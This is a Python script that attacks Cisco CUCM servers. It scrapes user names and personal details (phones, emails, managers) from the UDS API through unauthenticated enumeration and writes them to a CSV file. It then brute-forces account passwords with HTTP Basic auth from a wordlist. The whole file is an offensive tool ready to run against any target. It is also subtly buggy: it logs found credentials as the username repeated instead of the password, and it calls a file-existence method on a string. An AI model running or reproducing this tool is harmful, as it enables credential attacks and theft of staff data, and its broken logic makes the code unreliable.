#Grab users from CUCM and test passwords
import sys
import os
import re
import string
import requests
import base64
import argparse
import signal
import csv
from bs4 import BeautifulSoup
from os import getcwd
from pathlib import Path
from requests.packages import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# cli arguments
parser = argparse.ArgumentParser(description="Grab CUCM users and brute force them", formatter_class=argparse.RawDescriptionHelpFormatter)
parser.add_argument("-t", dest="target", required=True, help="CUCM Target (ex: https://192.168.1.2:8443")
parser.add_argument("-p", dest="proxy", required=False, help="Proxy through Burp", action="store_true")
parser.add_argument("-o", dest="output", required=False, type=argparse.FileType("w", encoding="UTF-8"), help="Output file", default="cucm-users.txt")
parser.add_argument("-b", dest="brute", required=False, type=argparse.FileType("r", encoding="UTF-8"), help="Brute force password file")

args = parser.parse_args()
target = args.target
proxy = args.proxy
outfile = args.output
brutefile = args.brute
if len(sys.argv)==1:
	parser.print_help(sys.stderr)
	sys.exit(1)

# handle sig
def handler(signum, frame):
	res = input(" Ctrl-c was pressed. Do you really want to exit? y/n ")
	if res == 'y':
		exit(1)
signal.signal(signal.SIGINT, handler)

# variables
cwd = getcwd()
userlist = target+'/cucm-uds/users'
userdir = target+'/cucm-uds/user/'
brute_url = userlist+'?name='
proxies = ''
passwd = ''

if proxy == True:
	proxies = { 'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080' }
def get_users():
	print("[.] Getting initial users")
	try:
		r1 = requests.get(userlist, verify=False, timeout=12, allow_redirects=True, proxies=proxies)
		if 'userName' in r1.text:
			s = BeautifulSoup(r1.text, 'xml')
			userss = s.find_all('userName')
			for deets in s.find_all('user'):
				saved(deets)
			blue = len(userss)
			print("[#] Discovered "+str(blue)+" user names from "+userlist)
			for user in userss:
				with open(outfile.name, mode='a') as outputfile:
					outputfile.write(user.get_text()+'\n')

		
	except Exception as e:
		print(e)
def createcsv():
	id = 'id'
	un = 'userName'
	fn = 'firstName'
	ln = 'lastName'
	mi = 'middleName'
	nn = 'nickName'
	dn = 'displayName'
	pn = 'phoneNumber'
	hn = 'homeNumber'
	mn = 'mobileNumber'
	em = 'email'
	du = 'directoryUri'
	mu = 'msUri'
	dp = 'department'
	mg = 'manager'
	ti = 'title'
	pg = 'pager'
	with open('cucm-users.csv', 'w') as csvfile:
		csvwriter = csv.writer(csvfile)
		csvwriter.writerow([id, un, fn, ln, mi, nn, dn, pn, hn, mn, em, du, mu, dp, mg, ti, pg])
def saved(deets):
	id = deets.find('id')
	username = deets.find('userName')
	firstname = deets.find('firstName')
	lastname = deets.find('lastName')
	middlename = deets.find('middleName')
	nickname = deets.find('nickName')
	displayname = deets.find('displayName')
	phonenumber = deets.find('phoneNumber')
	homenumber = deets.find('homeNumber')
	mobilenumber = deets.find('mobileNumber')
	email = deets.find('email')
	duri = deets.find('directoryUri')
	msuri = deets.find('msUri')
	dep = deets.find('department')
	manager = deets.find('manager')
	title = deets.find('title')
	pager = deets.find('pager')
	with open('cucm-users.csv', 'a', newline='') as csvfile:
		csvwriter = csv.writer(csvfile)
		csvwriter.writerow([username.get_text(), firstname.get_text(), lastname.get_text(), middlename.get_text(), nickname.get_text(), displayname.get_text(), phonenumber.get_text(), homenumber.get_text(), mobilenumber.get_text(), email.get_text(), duri.get_text(), msuri.get_text(), dep.get_text(), manager.get_text(), title.get_text(), pager.get_text()])
def brute_users_api():
	print("[.] Enumerating additional users")
	usernames = []
	try:
		for char1 in string.ascii_lowercase:
			for char2 in string.ascii_lowercase:
				url = brute_url+char1+char2
				__http_response = requests.get(url, timeout=12,verify=True, proxies=proxies)
				if __http_response.status_code != 404:
					lines = __http_response.text
					soup = BeautifulSoup(lines, 'xml')
					for deets in soup.find_all('user'):
						saved(deets)
					for user in soup.find_all('userName'):
						with open(outfile.name, mode='a') as outputfile:
							outputfile.write(user.text+'\n')

	except requests.exceptions.ConnectionError:
		print('CUCM Server {} is not responding'.format(target))
	with open(outfile.name, mode='r') as fp:
		x = len(fp.readlines())
		print('[#] Discovered '+str(x)+' additional users names from '+brute_url)
def crackit():
	print("[.] Checking for valid credentials using password file")
	valid = 'valid.txt'
	passwd = 'blah'
	with open(outfile.name, mode='r') as outputfile:
		for user in outputfile:
			if brutefile:
				with open(brutefile.name, mode='r') as bru:
					for password in bru:
						passwd = password.strip() 
						usera = user.strip()
						url = userdir+usera
						basic = base64.b64encode(bytes(usera+':'+passwd, 'utf-8'))
						basic1 = basic.decode('utf-8')
						basic2 = "Basic "+basic1
						headers = {"Authorization": basic2, "Connection": "close"}
						r2 = requests.get(url, headers=headers, verify=False, proxies=proxies)
						if r2.status_code == 200:
							#print("Username: "+usera+" Password: "+usera+" found")
							with open(valid, mode='a') as outputfile:
								outputfile.write(usera+':'+usera+'\n')
	if valid.exists():
		with open(valid, mode='r') as val:
			xy = len(val.readlines())
			print('[#] Discovered '+str(xy)+' valid username and password combinations')
	else:
		print('[#] Discovered 0 valid username and password combinations')

if __name__ == "__main__":
	createcsv()
	get_users()
	brute_users_api()
	if brutefile:
		crackit()
